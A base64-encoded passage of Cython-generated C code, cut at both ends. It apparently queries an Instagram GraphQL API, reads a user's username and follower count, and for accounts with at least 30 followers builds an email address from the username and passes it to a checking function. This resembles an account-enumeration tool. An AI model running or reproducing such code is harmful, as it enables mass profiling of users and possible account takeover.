PSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpOwogICAgICAgICAgICBhc3NlcnQoX19weXhfdF83KTsKICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzQpOwogICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF80LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgICAgfQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyAyIDogMCldID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc193d3dfaW5zdGFncmFtX2NvbV9hcGlfZ3JhcH07CiAgICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzUgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X3ZfcmVzcG9uc2U7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMik7CiAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgTlVMTH07CiAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMS1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgfQogICAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X3RfMTE7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX3B5eF90XzEyID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgIF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdF8xMn07CiAgICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgICB9CiAgICAgICAgICBfX3B5eF90XzcgPSBfX3B5eF90Xzk7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXIsIF9fcHl4X3RfMTF9OwogICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgzLV9fcHl4X3RfOCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDM0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICB9CiAgICAgICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzY7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgICAgIF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91c2VybmFtZX07CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzUgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF83ID0gX19weXhfdl9yZXNwb25zZTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpOwogICAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07CiAgICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMS1fX3B5eF90XzgpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTE7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF85KTsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDM2LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICAgIHsKICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3RfN307CiAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0MzUsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgIH0KICAgICAgICAgIF9fcHl4X3RfNiA9IF9fcHl4X3RfNDsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDQzNiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwgX19weXhfdF8xMX07CiAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzYsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIH0KCiAgICAgICAgICAKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5mb2luc3RhKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNDM1LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgaWYgKHVubGlrZWx5KChQeU9iamVjdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdF81KSA8IDApKSkgX19QWVhfRVJSKDAsIDQzNSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF80ID0gTlVMTDsKICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0MzcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDM3LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCA0MzcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19weXhfdF84ID0gMTsKICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzYpKSkgewogICAgICAgICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzYpOwogICAgICAgICAgICBhc3NlcnQoX19weXhfdF80KTsKICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzYpOwogICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF82LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgICAgfQogICAgICAgICAgI2VuZGlmCiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfMTF9OwogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQzNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9yciwgX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfdHVwbGVbOF0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZm93cywgX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzYgPSBQeU9iamVjdF9SaWNoQ29tcGFyZShfX3B5eF92X2Zvd3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8zMCwgUHlfR0UpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSgoX19weXhfdF8xMyA8IDApKSkgX19QWVhfRVJSKDAsIDQzOSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7CgogICAgICAgICAgICAKICAgICAgICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3ZfZG9tYWluKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgNDQwLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfZW1haWwsIF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAgICAgICAKICAgICAgICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hlY2tfb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNDQxLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICBfX3B5eF90XzggPSAxOwogICAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzExKSkpIHsKICAgICAgICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgICBfX3B5eF90XzggPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICB7CiAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdl9lbWFpbH07CiAgICAgICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF84LCAoMi1fX3B5eF90XzgpIHwgKF9fcHl4X3RfOCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0NDEsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgCiAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAKICAgICAgfQogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICBnb3RvIF9fcHl4X0wxMl90cnlfZW5kOwogICAgICBfX3B5eF9MNV9lcnJvcjo7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICAgIGlmIChfX3B5eF90XzE0KSB7CiAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS51dXUiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzYsICZfX3B5eF90XzExLCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA0NDMsIF9fcHl4X0w3X2V4Y2VwdF9lcnJvcikKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzExKTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfMTE7CiAgICAgICAgIHsKICAgICAgICB9CiAgICAgICAgIHsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDIyOwogICAgICAgICAgfQogICAgICA